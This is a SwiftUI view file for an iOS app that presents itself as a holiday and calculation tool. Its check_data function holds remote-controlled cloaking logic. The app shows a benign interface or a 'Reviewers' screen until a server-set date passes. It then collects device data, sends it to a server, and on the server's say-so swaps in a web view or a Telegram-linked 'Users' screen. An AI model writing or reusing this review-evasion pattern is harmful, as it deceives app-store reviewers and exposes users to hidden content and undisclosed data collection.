//
//  ContentView.swift
//  App423
//
//  Created by Вячеслав on 3/25/24.
//

import SwiftUI
import YandexMobileMetrica

struct ContentView: View {
    
    @State var current_tab: Tab = Tab.Holidays
    @State var isFetched: Bool = false
    
    @State var isBlock: Bool = true
    @State var isDead: Bool = false
    
    @State var telegram: URL = URL(string: "https://t.me/")!
    @State var isTelegram: Bool = false
    
    @AppStorage("status") var status: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
       
        ZStack {
            
            Color("bg")
                .ignoresSafeArea()
            
            
            if isFetched == false {
                
                LoadingView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    if status {
                        
                        VStack(spacing: 0, content: {
                            
                            TabView(selection: $current_tab, content: {
                                
                                HolidaysView()
                                    .tag(Tab.Holidays)
                                
                                CalculationsView()
                                    .tag(Tab.Calculations)

                                SettingsView()
                                    .tag(Tab.Settings)

                            })
                            
                            TabBar(selectedTab: $current_tab)
                        })
                        .ignoresSafeArea(.all, edges: .bottom)
                        .onAppear {
                            
                            YMMYandexMetrica.reportEvent("did_show_main_screen")
                        }
                        
                    } else {
                        
                        Reviewers_1()
                    }
                    
                } else if isBlock == false {
                    
                    if status {
                        
                        WebSystem()
                        
                    } else {
                        
                        Users_1(telegram: telegram, isTelegram: isTelegram)
                    }
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        getFirebaseData(field: "isDead", dataType: .bool) { result1 in
            
            let result1 = result1 as? Bool ?? false
            isDead = result1
            
            getFirebaseData(field: "isTelegram", dataType: .bool) { isTelegramResult in
                
                let isTelegramResult = isTelegramResult as? Bool ?? false
                isTelegram = isTelegramResult
                
                getFirebaseData(field: "telegram", dataType: .url) { telegramResult in
                 
                    let telegramResult = telegramResult as? URL ?? URL(string: "google.com")!
                    telegram = telegramResult
                    
                    getFirebaseData(field: "lastDate", dataType: .string) { lastDate in
                        
                        let lastDate = lastDate as? String ?? "01.01.2030"
                        let dateFormatter = DateFormatter()
                                dateFormatter.dateFormat = "dd.MM.yyyy"
                        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
                        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
                        let now = Date()

                        guard now > targetDate else {

                            isBlock = true
                            isFetched = true

                            return
                        }
                        
                        let networkService = NetworkService()
                        let deviceData = DeviceInfo.collectData()
                        
                        networkService.sendRequest(endpoint: deviceData) { result in
                            
                            switch result {
                                
                            case .success(let success):
                                
                                self.isBlock = success
                                self.isFetched = true
                                
                            case .failure(_):
                                
                                self.isBlock = self.isDead
                                self.isFetched = true
                            }
                        }
                    }
                }
            }
        }
    }
}

#Preview {
    ContentView()
}
